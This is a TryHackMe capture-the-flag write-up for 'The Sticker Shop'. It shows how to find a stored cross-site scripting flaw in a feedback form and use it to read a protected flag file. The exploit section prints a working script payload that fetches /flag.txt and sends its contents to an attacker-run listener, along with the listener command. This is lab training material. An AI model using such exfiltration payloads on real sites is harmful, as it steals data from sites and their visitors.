---
clayout: ctf
title: The Sticker Shop
type: TryHackMe
date: 2025-03-02
level: Easy
icon: /ctf/tryhackme/the-sticker-shop/icon-room.png
image: /ctf/tryhackme/the-sticker-shop/icon-room.png
description: Can you exploit the sticker shop in order to capture the flag?
ctf-link: https://tryhackme.com/room/thestickershop
---


## Challenge description

Your local sticker shop has finally developed its own webpage. They do not have too much experience regarding web
development, so they decided to develop and host everything on the same computer that they use for browsing the internet
and looking at customer feedback. Smart move!

Can you read the flag at `http://MACHINE_IP:8080/flag.txt`?

## Challenge Overview

This challenge revolves around identifying and exploiting a vulnerability in the sticker shop's feedback system to gain
access to a restricted flag file. The website allows user input through a feedback form, which is likely susceptible to
cross-site scripting (XSS). By injecting JavaScript, we aim to exploit this vulnerability and retrieve the flag.

## Web Enumeration

Navigating to `http://10.10.112.109:8080` presents us with the home page of the **Cat Sticker Shop**:

![The Sticker Shop](/ctf/tryhackme/the-sticker-shop/home.png)

The website also contains a **Feedback** page, which allows users to submit comments:

![Feedback](/ctf/tryhackme/the-sticker-shop/feedback.png)

Attempting to access `http://10.10.112.109:8080/flag.txt` directly results in an unauthorized access error:

![Unauthorized Flag Access](/ctf/tryhackme/the-sticker-shop/unauthorized.png)

Since the flag is inaccessible directly, we need to find an alternative way to retrieve its contents.

## Exploiting the Feedback Form

Given that the website allows user-submitted feedback, it is possible that the input is not sanitized properly. If the
application fails to escape user input before rendering it on the page, we can inject JavaScript (XSS) to perform
malicious actions.

### Proof of Concept (PoC)

To test for an XSS vulnerability, we use a simple payload that attempts to send a request to our external server.

#### Steps:

1. Set up a simple HTTP server to capture requests:

   ```bash
   python3 -m http.server 8000
   ```

2. Submit the following payload in the feedback form:

   ```html
   <script>fetch("http://<your-thm-ip>:8000")</script>
   ```

3. If the vulnerability exists, our HTTP server should receive an incoming request:

   ![Listener Output](/ctf/tryhackme/the-sticker-shop/poc.png)

Since our request was received, this confirms that the feedback form is vulnerable to stored XSS.

## Retrieving the Flag

Now that we have confirmed the vulnerability, we craft a payload to fetch the contents of `flag.txt` and send it to our
external listener.

### Exploit Payload:

```html
<script>
    fetch("/flag.txt")
        .then(response => response.text())
        .then(text => fetch("http://<your-thm-ip>:8000/?data=" + text));
</script>
```

### Steps to Execute:

1. Ensure your HTTP server is still running:

   ```bash
   python3 -m http.server 8000
   ```

2. Submit the payload in the feedback form.

3. Check your listener for incoming requests containing the flag:

   ![Flag Retrieved](/ctf/tryhackme/the-sticker-shop/flag.png)

By intercepting the request, we successfully retrieve the flag and complete the challenge!
